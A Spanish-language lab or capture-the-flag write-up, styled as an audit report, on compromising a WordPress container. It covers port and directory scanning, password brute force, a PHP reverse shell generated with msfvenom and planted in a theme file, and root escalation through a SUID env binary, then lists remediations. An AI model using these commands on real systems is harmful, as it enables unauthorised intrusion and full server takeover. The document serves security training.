# 🛡️ REPORTE DE AUDITORÍA: WalkingCMS (172.17.0.2)

## 📊 RESUMEN

Compromiso total del servidor **172.17.0.2**.  
Se explotó una mala gestión de credenciales en WordPress y una configuración insegura del bit **SUID** en el binario `env`, permitiendo escalar privilegios de `www-data` a `root`.

---

## 🔍 1. FASE DE RECONOCIMIENTO

### 🌐 Escaneo de Puertos y Servicios

```bash
nmap -p- --open -sS -sC -sV -T4 -n -vvv -O -Pn 172.17.0.2
```

### 📌 Hallazgos

- Puerto **80/tcp** abierto  
- Apache **2.4.57 (Debian)**  
- Sistema Linux (posible Docker por TTL 64)

---

### 📂 Enumeración de Directorios (Gobuster)

#### 🔹 Fase 1: Raíz

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt,py,sh,log,zip,old,bak
```

**Resultado:**

- `/wordpress` (301)

---

#### 🔹 Fase 2: /wordpress

```bash
gobuster dir -u http://172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt,py,sh,log,zip,old,bak
```

### 📌 Hallazgos

- `/wp-admin`  
- `/wp-login.php`  
- `/xmlrpc.php`  
- `/license.txt`  
- `/readme.html`  
- `/wp-content`  
- `/wp-includes`  

---

## 🛠️ 2. GANANDO ACCESO (EXPLOTACIÓN)

### 🔐 Fuerza bruta con WPScan

```bash
wpscan --url http://172.17.0.2/wordpress --usernames mario --passwords /usr/share/wordlists/rockyou.txt --force
```

### 📌 Credenciales obtenidas

```
mario : love
```

---

### 💻 Ejecución de Código Remoto (RCE)

#### Generación del payload

```bash
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=4444 -f raw > pwned.php
```

#### Listener

```bash
nc -lvnp 4444
```

#### Ejecución

- Acceso al panel de WordPress  
- Edición del archivo `404.php` desde el editor de temas  
- Inserción del payload  

### 📌 Resultado

```
www-data
```

---

## 📈 3. ESCALADA DE PRIVILEGIOS

### 🔎 Enumeración SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

### 📌 Binario vulnerable

```
/usr/bin/env
```

---

### ⚡ Explotación

```bash
/usr/bin/env /bin/bash -p
```

### 📌 Resultado

```bash
whoami
```

```
root
```

---

## 📸 EVIDENCIAS

- Nmap → Puerto 80 abierto  ![[nmap_cms 1.png]]
- 
- Gobuster → `/wordpress` y endpoints  ![[gobuster1_cms 1.png]]
- ![[guster_2_cms 1.png]]
- WPScan → credenciales válidas  ![[wpscan_contraseña_cms 1.png]]
![[wpscan_password_cms 1.png]]

- Reverse shell → `www-data`  ![[nc_1_acceso 1.png]]
- PrivEsc → `root`  ![[nc_2_acceso 1.png]]

---

## 🛡️ RECOMENDACIONES

### 🔧 Sistema

```bash
chmod u-s /usr/bin/env
```

---

### 🔒 WordPress

```php
define('DISALLOW_FILE_EDIT', true);
```

Además:

- Deshabilitar XML-RPC  
- Restringir acceso a `/wp-admin`  

---

### 🔑 Credenciales

- Usar contraseñas robustas  
- Evitar diccionarios comunes  
- Implementar MFA  

---

## 🧠 CONCLUSIÓN

Cadena de ataque:

1. Enumeración → WordPress  
2. Fuerza bruta → credenciales débiles  
3. RCE → editor de temas  
4. PrivEsc → SUID en `env`  

➡️ **Compromiso total del sistema**
